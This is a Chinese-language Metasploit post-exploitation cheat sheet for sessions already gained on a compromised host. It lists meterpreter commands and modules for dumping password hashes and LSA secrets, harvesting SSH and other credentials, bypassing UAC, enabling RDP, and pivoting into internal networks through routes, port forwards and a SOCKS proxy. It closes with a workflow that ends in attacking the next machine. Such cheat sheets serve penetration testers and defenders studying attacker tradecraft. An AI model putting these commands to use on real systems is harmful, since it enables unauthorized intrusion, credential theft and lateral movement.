# MSF 后渗透速查

> 适用场景：已经获得 `shell` 或 `meterpreter` 会话，需要提权、抓凭据、横向和建立代理。

## 1. Session 管理

```text
sessions -l
sessions -i <id>
background
sessions -k <id>
```

## 2. Meterpreter 基础

```text
sysinfo
getuid
getpid
ps
migrate <pid>
getprivs
getsystem
shell
```

## 3. 文件与执行

```text
pwd
ls
cd
download <remote> <local>
upload <local> <remote>
cat <file>
edit <file>
execute -f <program> -a "<args>"
execute -H -i -f cmd.exe
```

## 4. 凭据收集

```text
hashdump
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```

Windows 本地信息：

```text
run post/windows/gather/enum_patches
run post/windows/gather/enum_logged_on_users
run post/windows/gather/credentials/credential_collector
```

## 5. 本地提权检测

```text
run post/multi/recon/local_exploit_suggester
background
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

Windows：

```text
use post/windows/gather/enum_patches
use post/windows/local/bypassuac
use post/windows/local/ask
```

## 6. 内网路由与代理

添加路由：

```text
run autoroute -s 10.10.10.0/24
run autoroute -p
```

端口转发：

```text
portfwd add -l 3389 -p 3389 -r 10.10.10.20
portfwd list
portfwd delete -l 3389
```

SOCKS 代理：

```text
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run -j
```

配合 Proxychains：

```bash
proxychains4 nmap -sT -Pn 10.10.10.0/24
proxychains4 curl http://10.10.10.20/
```

## 7. 常用 Post 模块

```text
run post/multi/gather/env
run post/multi/gather/ssh_creds
run post/linux/gather/enum_configs
run post/linux/gather/enum_network
run post/linux/gather/hashdump

run post/windows/gather/checkvm
run post/windows/gather/enum_applications
run post/windows/gather/enum_shares
run post/windows/manage/enable_rdp
```

## 8. 常用流程

```text
获得 Session
→ sysinfo / getuid / getprivs
→ 看进程与网络
→ 收集配置、凭据和 Hash
→ 判断能否直接横向
→ 必要时提权
→ autoroute / portfwd / socks_proxy
→ 扫描并攻击下一台机器
```

> 不要一上线就运行提权模块。优先查找配置文件、历史记录、SSH Key、数据库密码和可复用凭据。